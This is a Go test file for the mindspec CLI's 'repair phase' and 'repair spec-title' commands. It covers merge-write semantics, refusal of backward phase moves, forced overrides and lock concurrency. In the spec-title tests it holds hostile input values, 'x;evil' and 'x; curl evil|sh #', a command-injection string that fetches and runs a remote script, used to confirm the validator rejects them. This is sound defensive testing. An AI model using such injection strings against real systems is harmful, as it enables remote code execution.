package main

// Spec 092 Bead 3 (Req 19): `mindspec repair phase <spec-id>` unit
// tests — re-derive from children, write via the bead.MergeMetadata
// seam (merge semantics; the preservation diff itself is pinned in
// internal/bead TestMergeMetadata_PreservesUnrelatedKeys), and emit
// guard-convention failures. The HasFinalRecoveryLine assertions are
// the per-site Req 21 mirror for this package (see
// internal/guard/recovery_convention_test.go).

import (
	"encoding/json"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/mrmaxsteel/mindspec/internal/bead"
	"github.com/mrmaxsteel/mindspec/internal/guard"
	"github.com/mrmaxsteel/mindspec/internal/phase"
)

// stubRepairFindRoot fixture-scopes repairFindRootFn to root for the
// duration of one test (round-1 panel G2, hard-block driver: production
// findRoot()'s ambient-cwd resolution can walk up to the SHARED MAIN
// checkout from a git-linked bead worktree — a real, observed failure
// mode this seam exists to close for every test that reaches
// WithPhaseWriteLock). Restores the original seam on t.Cleanup.
func stubRepairFindRoot(t *testing.T, root string) {
	t.Helper()
	orig := repairFindRootFn
	repairFindRootFn = func() (string, error) { return root, nil }
	t.Cleanup(func() { repairFindRootFn = orig })
}

// TestRepairMergeMetadataFnDefaultsToBeadMergeMetadata kills panel-R3
// mutant M4a-2: the production binding of the repair write seam MUST
// be bead.MergeMetadata (read-merge-write). A rebind to a raw replace
// path would silently wipe unrelated metadata keys — the exact failure
// `mindspec repair phase` exists to prevent (Req 19).
func TestRepairMergeMetadataFnDefaultsToBeadMergeMetadata(t *testing.T) {
	if reflect.ValueOf(repairMergeMetadataFn).Pointer() != reflect.ValueOf(bead.MergeMetadata).Pointer() {
		t.Fatal("repairMergeMetadataFn must default to bead.MergeMetadata (merge semantics, spec 092 Req 19)")
	}
}

// stubRepairPhaseEnv wires the phase package stubs with one epic
// ("epic-92") for spec "092-agent-contract-hardening" whose stored
// phase is `stored` and whose children are all closed (derived =
// review), and swaps the repair merge seam for `merge`.
func stubRepairPhaseEnv(t *testing.T, stored string, merge func(string, map[string]interface{}) error) {
	t.Helper()
	stubRepairFindRoot(t, t.TempDir())
	meta := map[string]interface{}{
		"spec_num":             float64(92),
		"spec_title":           "agent-contract-hardening",
		"mindspec_migrated_at": "2026-01-01T00:00:00Z",
	}
	if stored != "" {
		meta["mindspec_phase"] = stored
	}
	epics := []phase.EpicInfo{{
		ID: "epic-92", Title: "[SPEC 092-agent-contract-hardening] Hardening", Status: "open",
		IssueType: "epic", Metadata: meta,
	}}
	restoreList := phase.SetListJSONForTest(func(args ...string) ([]byte, error) {
		for _, a := range args {
			if a == "--type=epic" {
				return json.Marshal(epics)
			}
			if strings.HasPrefix(a, "--parent") {
				return json.Marshal([]phase.ChildInfo{{ID: "b1", Status: "closed", IssueType: "task"}})
			}
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreList)
	restoreRun := phase.SetRunBDForTest(func(args ...string) ([]byte, error) {
		if len(args) >= 2 && args[0] == "show" && args[1] == "epic-92" {
			return json.Marshal(epics)
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreRun)

	origMerge := repairMergeMetadataFn
	repairMergeMetadataFn = merge
	t.Cleanup(func() { repairMergeMetadataFn = origMerge })
}

// stubRepairPhaseEnvWithChildren is stubRepairPhaseEnv's variant with
// explicit control over the epic's children, used by the R3.3
// backward-move guard tests below: the #248 fixture shape needs
// stored=implement with ALL children OPEN (derived=plan, a genuine
// backward disagreement), not the forward/same-value shapes
// stubRepairPhaseEnv's fixed one-closed-child fixture exercises. Per the
// plan's round-3 G2 fixture-state pinning, the epic metadata carries
// mindspec_phase_semantics: "v2" so bead 2's legacy-reconciliation (not
// yet wired in this bead) will find these fixtures already-reconciled
// and leave them untouched once it lands.
func stubRepairPhaseEnvWithChildren(t *testing.T, stored string, children []phase.ChildInfo, merge func(string, map[string]interface{}) error) {
	t.Helper()
	stubRepairFindRoot(t, t.TempDir())
	meta := map[string]interface{}{
		"spec_num":                 float64(92),
		"spec_title":               "agent-contract-hardening",
		"mindspec_migrated_at":     "2026-01-01T00:00:00Z",
		"mindspec_phase_semantics": "v2",
	}
	if stored != "" {
		meta["mindspec_phase"] = stored
	}
	epics := []phase.EpicInfo{{
		ID: "epic-92", Title: "[SPEC 092-agent-contract-hardening] Hardening", Status: "open",
		IssueType: "epic", Metadata: meta,
	}}
	restoreList := phase.SetListJSONForTest(func(args ...string) ([]byte, error) {
		for _, a := range args {
			if a == "--type=epic" {
				return json.Marshal(epics)
			}
			if strings.HasPrefix(a, "--parent") {
				return json.Marshal(children)
			}
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreList)
	restoreRun := phase.SetRunBDForTest(func(args ...string) ([]byte, error) {
		if len(args) >= 2 && args[0] == "show" && args[1] == "epic-92" {
			return json.Marshal(epics)
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreRun)

	origMerge := repairMergeMetadataFn
	repairMergeMetadataFn = merge
	t.Cleanup(func() { repairMergeMetadataFn = origMerge })
}

// setForceBackwardFlag sets repairPhaseCmd's --force-backward flag for
// the duration of one test and restores both its value and Changed bit
// on cleanup — cobra/pflag's Set() always marks Changed=true even when
// restoring to "", so a plain restore-by-Set would leave Changed stuck
// true for every later test in this process; restoring the exported
// Changed field directly is the precise fix.
func setForceBackwardFlag(t *testing.T, reason string) {
	t.Helper()
	f := repairPhaseCmd.Flags().Lookup("force-backward")
	if f == nil {
		t.Fatal("repairPhaseCmd has no --force-backward flag registered")
	}
	origValue := f.Value.String()
	origChanged := f.Changed
	if err := f.Value.Set(reason); err != nil {
		t.Fatalf("setting --force-backward: %v", err)
	}
	f.Changed = true
	t.Cleanup(func() {
		_ = f.Value.Set(origValue)
		f.Changed = origChanged
	})
}

// TestRepairPhase_BackwardMoveRefused is AC-5(ii): on the stored-implement/
// all-children-open #248 fixture, repairPhaseRunE refuses the backward
// write (implement -> plan), leaves the merge seam UNCALLED (so stored
// mindspec_phase is left unchanged), exits non-zero, and the failure
// carries a final recovery line naming the --force-backward escape.
func TestRepairPhase_BackwardMoveRefused(t *testing.T) {
	calls := 0
	stubRepairPhaseEnvWithChildren(t, "implement", []phase.ChildInfo{
		{ID: "b1", Status: "open", IssueType: "task"},
		{ID: "b2", Status: "open", IssueType: "task"},
	}, func(id string, updates map[string]interface{}) error {
		calls++
		return nil
	})

	err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"})
	if err == nil {
		t.Fatal("expected a refusal for the backward implement -> plan move")
	}
	if !guard.HasFinalRecoveryLine(err.Error()) {
		t.Errorf("backward-move refusal must end with a recovery line: %v", err)
	}
	if calls != 0 {
		t.Errorf("merge seam calls = %d, want 0 — stored mindspec_phase must be left unchanged on refusal", calls)
	}
	if !strings.Contains(err.Error(), "force-backward") {
		t.Errorf("refusal should name the --force-backward escape: %v", err)
	}
}

// TestRepairPhase_ForceBackwardWritesAndRecordsReason is AC-5(iii): with
// --force-backward "<reason>", the backward write proceeds, the reason is
// recorded on the epic metadata, AND the printed success line itself
// names the recorded reason (not merely the stored metadata).
func TestRepairPhase_ForceBackwardWritesAndRecordsReason(t *testing.T) {
	var gotUpdates map[string]interface{}
	calls := 0
	stubRepairPhaseEnvWithChildren(t, "implement", []phase.ChildInfo{
		{ID: "b1", Status: "open", IssueType: "task"},
	}, func(id string, updates map[string]interface{}) error {
		calls++
		gotUpdates = updates
		return nil
	})
	setForceBackwardFlag(t, "reverting a bad claim")

	out, err := captureStdout(t, func() error {
		return repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"})
	})
	if err != nil {
		t.Fatalf("forced backward repair must succeed: %v", err)
	}
	if calls != 1 {
		t.Fatalf("merge seam calls = %d, want 1", calls)
	}
	if gotUpdates["mindspec_phase"] != "plan" {
		t.Errorf("mindspec_phase = %v, want plan", gotUpdates["mindspec_phase"])
	}
	if gotUpdates["mindspec_phase_force_reason"] != "reverting a bad claim" {
		t.Errorf("recorded reason = %v, want %q", gotUpdates["mindspec_phase_force_reason"], "reverting a bad claim")
	}
	if !strings.Contains(out, "reverting a bad claim") {
		t.Errorf("success output must name the recorded reason itself, not just the stored metadata: %q", out)
	}
}

// TestRepairPhase_ForceBackwardRequiresNonEmptyReason mirrors the
// --allow-doc-skew/--override-adr discipline: an explicit empty reason
// (--force-backward="") is rejected, never silently treated as unset.
func TestRepairPhase_ForceBackwardRequiresNonEmptyReason(t *testing.T) {
	stubRepairPhaseEnvWithChildren(t, "implement", []phase.ChildInfo{
		{ID: "b1", Status: "open", IssueType: "task"},
	}, func(string, map[string]interface{}) error {
		t.Error("merge seam must not be called when --force-backward is rejected")
		return nil
	})
	setForceBackwardFlag(t, "")

	if err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"}); err == nil {
		t.Fatal("expected an error for an explicit empty --force-backward reason")
	}
}

// concurrencyFixtureStore is a thread-safe fake epic metadata store for
// TestRepairPhase_ConcurrentWriterNeverRegressed: its merge method is
// used BOTH as the repairMergeMetadataFn seam and directly as the
// simulated concurrent writer's WithPhaseWriteLock mergeMetadata
// parameter, and its JSON feeds the phase-package read seams, so every
// fresh read observes whichever write landed most recently.
type concurrencyFixtureStore struct {
	mu       sync.Mutex
	metadata map[string]interface{}
}

func (s *concurrencyFixtureStore) merge(id string, updates map[string]interface{}) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	for k, v := range updates {
		s.metadata[k] = v
	}
	return nil
}

func (s *concurrencyFixtureStore) get(key string) interface{} {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.metadata[key]
}

func (s *concurrencyFixtureStore) epicsJSON() ([]byte, error) {
	s.mu.Lock()
	meta := make(map[string]interface{}, len(s.metadata))
	for k, v := range s.metadata {
		meta[k] = v
	}
	s.mu.Unlock()
	epics := []phase.EpicInfo{{
		ID: "epic-92", Title: "[SPEC 092-agent-contract-hardening] Hardening", Status: "open",
		IssueType: "epic", Metadata: meta,
	}}
	return json.Marshal(epics)
}

// TestRepairPhase_ConcurrentWriterNeverRegressed is AC-5(v): with the
// R3.3 lock in place, a concurrent writer advancing stored phase to
// "review" while repair phase is inside (or waiting to enter) its
// critical section — driven via the repairMergeMetadataFn seam plus a
// contending goroutine on the REAL lock in a fixture repo — never ends
// with stored regressed to "implement". Round-1 panel G1/R3/R6: repair's
// own derivation now runs FRESH, INSIDE its own critical section
// (mirroring SanctionedDerivedSync), reading the same all-open children
// fixture the concurrent writer never touches — so it derives "plan"
// fresh, exactly as a pre-lock snapshot would have — and once the
// concurrent writer's fresher "review" is visible under the lock,
// phase.IsBackwardMove("review", "plan") is true and repair refuses; the
// final stored value is "review".
//
// Round-1 panel G2 (hard-block driver): the lock root is fixture-scoped
// via stubRepairFindRoot (a throwaway t.TempDir()) rather than resolved
// via findRoot()'s ambient cwd, which — run from this bead's own linked
// worktree — can walk up to the SHARED MAIN checkout and both fail in a
// sandboxed CI environment and leave real dirt behind.
//
// Round-1 panel G6: deterministic barriers, not sleep-based scheduling.
func TestRepairPhase_ConcurrentWriterNeverRegressed(t *testing.T) {
	root := t.TempDir()
	stubRepairFindRoot(t, root)

	store := &concurrencyFixtureStore{metadata: map[string]interface{}{
		"spec_num":                 float64(92),
		"spec_title":               "agent-contract-hardening",
		"mindspec_phase":           "implement",
		"mindspec_migrated_at":     "2026-01-01T00:00:00Z",
		"mindspec_phase_semantics": "v2",
	}}
	children := []phase.ChildInfo{
		{ID: "b1", Status: "open", IssueType: "task"},
		{ID: "b2", Status: "open", IssueType: "task"},
	}

	restoreList := phase.SetListJSONForTest(func(args ...string) ([]byte, error) {
		for _, a := range args {
			if a == "--type=epic" {
				return store.epicsJSON()
			}
			if strings.HasPrefix(a, "--parent") {
				return json.Marshal(children)
			}
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreList)
	restoreRun := phase.SetRunBDForTest(func(args ...string) ([]byte, error) {
		if len(args) >= 2 && args[0] == "show" && args[1] == "epic-92" {
			return store.epicsJSON()
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreRun)
	origMerge := repairMergeMetadataFn
	repairMergeMetadataFn = store.merge
	t.Cleanup(func() { repairMergeMetadataFn = origMerge })

	holderEntered := make(chan struct{})
	releaseHolder := make(chan struct{})
	go func() {
		_ = phase.WithPhaseWriteLock(root, "epic-92", store.merge, func(string, bool) (map[string]interface{}, error) {
			close(holderEntered)
			<-releaseHolder
			return map[string]interface{}{"mindspec_phase": "review"}, nil
		})
	}()
	<-holderEntered

	// Round-2 panel G4.1: the "attempted acquisition" proof must come
	// from INSIDE the real kernel-level lock-acquisition path — a
	// channel closed by the caller before invoking repairPhaseRunE does
	// NOT prove the goroutine was ever scheduled far enough to reach the
	// actual syscall attempt.
	repairAttempting := make(chan struct{})
	var attemptOnce sync.Once
	t.Cleanup(phase.SetAcquireAttemptHookForTest(func() {
		attemptOnce.Do(func() { close(repairAttempting) })
	}))
	repairDone := make(chan error, 1)
	go func() {
		repairDone <- repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"})
	}()
	// Deterministic: repairPhaseRunE's goroutine has genuinely reached
	// the real lock-acquisition syscall attempt before we ever release
	// the concurrent-writer holder.
	select {
	case <-repairAttempting:
	case <-time.After(5 * time.Second):
		t.Fatal("repairPhaseRunE never reached a lock-acquisition attempt")
	}

	// Deterministic negative window: repair cannot possibly have
	// completed while the concurrent writer still holds the lock.
	select {
	case <-repairDone:
		t.Fatal("repairPhaseRunE completed before the concurrent writer released the lock")
	case <-time.After(150 * time.Millisecond):
	}

	close(releaseHolder)

	select {
	case repairErr := <-repairDone:
		if repairErr == nil {
			t.Fatal("expected repair phase to refuse: its freshly-derived target (plan, from the all-open children) is backward against the concurrent writer's fresher stored review")
		}
	case <-time.After(5 * time.Second):
		t.Fatal("repairPhaseRunE never returned")
	}

	if got := store.get("mindspec_phase"); got != "review" {
		t.Errorf("final stored mindspec_phase = %v, want %q (the concurrent writer's fresher value must never be regressed)", got, "review")
	}
}

func TestRepairPhase_WritesDerivedViaMergeSeam(t *testing.T) {
	var gotID string
	var gotUpdates map[string]interface{}
	calls := 0
	stubRepairPhaseEnv(t, "implement", func(id string, updates map[string]interface{}) error {
		calls++
		gotID = id
		gotUpdates = updates
		return nil
	})

	if err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"}); err != nil {
		t.Fatalf("repair phase: %v", err)
	}
	if calls != 1 {
		t.Fatalf("merge seam calls = %d, want 1", calls)
	}
	if gotID != "epic-92" {
		t.Errorf("merge target = %q, want epic-92", gotID)
	}
	// Exactly the derived phase, nothing else: merge semantics mean
	// the update set carries ONLY the key being repaired.
	if len(gotUpdates) != 1 || gotUpdates["mindspec_phase"] != "review" {
		t.Errorf("merge updates = %v, want only mindspec_phase=review", gotUpdates)
	}
}

func TestRepairPhase_UnknownSpecFailsWithRecoveryLine(t *testing.T) {
	stubRepairPhaseEnv(t, "implement", func(id string, updates map[string]interface{}) error {
		t.Error("merge seam must not be called for an unknown spec")
		return nil
	})

	err := repairPhaseRunE(repairPhaseCmd, []string{"099-nope"})
	if err == nil {
		t.Fatal("expected error for unknown spec")
	}
	if !guard.HasFinalRecoveryLine(err.Error()) {
		t.Errorf("repair failure must end with a recovery line (Req 12/21): %v", err)
	}
	if strings.Contains(err.Error(), "bd update --metadata") {
		t.Errorf("emitted message contains banned raw metadata command (Req 19): %v", err)
	}
}

func TestRepairPhase_WriteFailureHasRecoveryLine(t *testing.T) {
	stubRepairPhaseEnv(t, "implement", func(id string, updates map[string]interface{}) error {
		return errMock
	})

	err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"})
	if err == nil {
		t.Fatal("expected error when the merge-write fails")
	}
	if !guard.HasFinalRecoveryLine(err.Error()) {
		t.Errorf("repair write failure must end with a recovery line: %v", err)
	}
	if !strings.Contains(err.Error(), "mindspec repair phase 092-agent-contract-hardening") {
		t.Errorf("recovery should be the re-runnable repair command: %v", err)
	}
	if strings.Contains(err.Error(), "bd update --metadata") {
		t.Errorf("emitted message contains banned raw metadata command (Req 19): %v", err)
	}
}

// TestRepairPhase_AlreadyConsistentStillMergeWrites covers the
// stored==derived re-run path (repair.go): the command still performs
// the merge-write (idempotent refresh) and succeeds.
func TestRepairPhase_AlreadyConsistentStillMergeWrites(t *testing.T) {
	calls := 0
	var gotUpdates map[string]interface{}
	stubRepairPhaseEnv(t, "review", func(id string, updates map[string]interface{}) error {
		calls++
		gotUpdates = updates
		return nil
	})

	if err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"}); err != nil {
		t.Fatalf("already-consistent repair must succeed, got: %v", err)
	}
	if calls != 1 {
		t.Fatalf("merge seam calls = %d, want 1 (idempotent refresh)", calls)
	}
	if len(gotUpdates) != 1 || gotUpdates["mindspec_phase"] != "review" {
		t.Errorf("merge updates = %v, want only mindspec_phase=review", gotUpdates)
	}
}

// TestRepairPhase_TerminalRowClosedDoneMarkerAllClosedChildren is the
// round-2 panel G2 pinning fixture: a closed epic with a done marker and
// all-closed children must derive "done" (the status-aware surface) and
// take the already-consistent path — never refuse as a "backward move"
// to review, and never write anything on a forced retry either, since
// there is nothing to fix. Red-on-revert: bare phase.DerivePhaseFromChildren
// (ignoring epic status/done marker) returns "review" for an all-closed
// child set, which IsBackwardMove("done", "review") calls backward,
// causing repair to refuse — and, if an operator obeyed the printed
// --force-backward hint, would regress a healthy done epic to review.
func TestRepairPhase_TerminalRowClosedDoneMarkerAllClosedChildren(t *testing.T) {
	stubRepairFindRoot(t, t.TempDir())
	epics := []phase.EpicInfo{{
		ID: "epic-92", Title: "[SPEC 092-agent-contract-hardening] Hardening", Status: "closed",
		IssueType: "epic", Metadata: map[string]interface{}{
			"spec_num":             float64(92),
			"spec_title":           "agent-contract-hardening",
			"mindspec_migrated_at": "2026-01-01T00:00:00Z",
			"mindspec_phase":       "done",
			"mindspec_done":        true,
		},
	}}
	children := []phase.ChildInfo{
		{ID: "b1", Status: "closed", IssueType: "task"},
		{ID: "b2", Status: "closed", IssueType: "task"},
	}
	restoreList := phase.SetListJSONForTest(func(args ...string) ([]byte, error) {
		for _, a := range args {
			if a == "--type=epic" {
				return json.Marshal(epics)
			}
			if strings.HasPrefix(a, "--parent") {
				return json.Marshal(children)
			}
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreList)
	restoreRun := phase.SetRunBDForTest(func(args ...string) ([]byte, error) {
		if len(args) >= 2 && args[0] == "show" && args[1] == "epic-92" {
			return json.Marshal(epics)
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreRun)

	calls := 0
	var gotUpdates map[string]interface{}
	origMerge := repairMergeMetadataFn
	repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
		calls++
		gotUpdates = updates
		return nil
	}
	t.Cleanup(func() { repairMergeMetadataFn = origMerge })

	out, err := captureStdout(t, func() error {
		return repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"})
	})
	if err != nil {
		t.Fatalf("repair phase on a terminal done epic must succeed (already-consistent), got: %v", err)
	}
	if !strings.Contains(out, "already consistent") {
		t.Errorf("expected the already-consistent success line, got: %q", out)
	}
	if strings.Contains(out, "force") {
		t.Errorf("must never suggest --force-backward for an already-terminal done epic: %q", out)
	}
	// The merge-write still runs (idempotent refresh, matching the
	// established already-consistent contract) but writes the SAME
	// value back — stored effectively stays "done".
	if calls != 1 {
		t.Fatalf("merge seam calls = %d, want 1 (idempotent refresh)", calls)
	}
	if gotUpdates["mindspec_phase"] != "done" {
		t.Errorf("mindspec_phase = %v, want %q (never regressed to review)", gotUpdates["mindspec_phase"], "done")
	}
}

// errMock is a sentinel error for the write-failure path.
var errMock = &mockErr{}

type mockErr struct{}

func (*mockErr) Error() string { return "dolt offline" }

// TestRepairSpecTitle is spec 120 AC-8 (R3 lever): `mindspec repair
// spec-title <epic-id> <title>` merge-writes spec_title via the
// repairMergeMetadataFn seam preserving unrelated metadata keys (HC-5);
// REFUSES an invalid <epic-id> argument before any bd invocation (round-3
// O3); refuses a replacement title whose slug fails the corrected
// idvalidate.SpecID; prints only escaped/validated values.
func TestRepairSpecTitle(t *testing.T) {
	stubGetMeta := func(t *testing.T, meta map[string]interface{}) {
		t.Helper()
		origGet := repairGetMetadataFn
		repairGetMetadataFn = func(id string) (map[string]interface{}, error) {
			return meta, nil
		}
		t.Cleanup(func() { repairGetMetadataFn = origGet })
	}

	t.Run("merge-writes preserving unrelated metadata keys", func(t *testing.T) {
		stubGetMeta(t, map[string]interface{}{
			"spec_num":             float64(120),
			"spec_title":           "old-hostile-title",
			"mindspec_phase":       "implement",
			"mindspec_migrated_at": "2026-01-01T00:00:00Z",
		})
		var gotID string
		var gotUpdates map[string]interface{}
		calls := 0
		origMerge := repairMergeMetadataFn
		repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
			calls++
			gotID = id
			gotUpdates = updates
			return nil
		}
		t.Cleanup(func() { repairMergeMetadataFn = origMerge })

		if err := repairSpecTitleRunE(repairSpecTitleCmd, []string{"mindspec-hostile-epic", "trust boundary render audit"}); err != nil {
			t.Fatalf("repair spec-title: %v", err)
		}
		if calls != 1 {
			t.Fatalf("merge seam calls = %d, want 1", calls)
		}
		if gotID != "mindspec-hostile-epic" {
			t.Errorf("merge target = %q, want mindspec-hostile-epic", gotID)
		}
		// Merge semantics: the update set carries ONLY spec_title — never
		// re-writing spec_num or any other key (HC-5, unrelated keys
		// preserved by the read-merge-write, not by this update map).
		if len(gotUpdates) != 1 || gotUpdates["spec_title"] != "trust boundary render audit" {
			t.Errorf("merge updates = %v, want only spec_title", gotUpdates)
		}
	})

	t.Run("refuses an invalid epic-id before any bd invocation", func(t *testing.T) {
		var getCalls, mergeCalls int
		origGet := repairGetMetadataFn
		repairGetMetadataFn = func(id string) (map[string]interface{}, error) {
			getCalls++
			return nil, nil
		}
		t.Cleanup(func() { repairGetMetadataFn = origGet })
		origMerge := repairMergeMetadataFn
		repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
			mergeCalls++
			return nil
		}
		t.Cleanup(func() { repairMergeMetadataFn = origMerge })

		for _, hostile := range []string{"--help", "x;evil"} {
			err := repairSpecTitleRunE(repairSpecTitleCmd, []string{hostile, "some title"})
			if err == nil {
				t.Errorf("repairSpecTitleRunE(%q, ...) accepted a hostile epic id", hostile)
			}
			if !guard.HasFinalRecoveryLine(err.Error()) {
				t.Errorf("refusal for %q must end with a recovery line: %v", hostile, err)
			}
		}
		if getCalls != 0 || mergeCalls != 0 {
			t.Errorf("expected ZERO bd invocations before the epic-id refusal, got get=%d merge=%d", getCalls, mergeCalls)
		}
	})

	t.Run("refuses a replacement title whose slug is invalid", func(t *testing.T) {
		stubGetMeta(t, map[string]interface{}{
			"spec_num":   float64(120),
			"spec_title": "clean-title",
		})
		var mergeCalls int
		origMerge := repairMergeMetadataFn
		repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
			mergeCalls++
			return nil
		}
		t.Cleanup(func() { repairMergeMetadataFn = origMerge })

		err := repairSpecTitleRunE(repairSpecTitleCmd, []string{"mindspec-hostile-epic", "x; curl evil|sh #"})
		if err == nil {
			t.Fatal("expected a refusal for a title whose slug fails idvalidate.SpecID")
		}
		if !guard.HasFinalRecoveryLine(err.Error()) {
			t.Errorf("refusal must end with a recovery line: %v", err)
		}
		if mergeCalls != 0 {
			t.Errorf("expected ZERO merge-write calls for an invalid replacement title, got %d", mergeCalls)
		}
		if strings.ContainsRune(err.Error(), 0x00) || strings.ContainsRune(err.Error(), 0x1b) {
			t.Errorf("refusal must not contain raw NUL/ESC bytes: %q", err.Error())
		}
	})
}
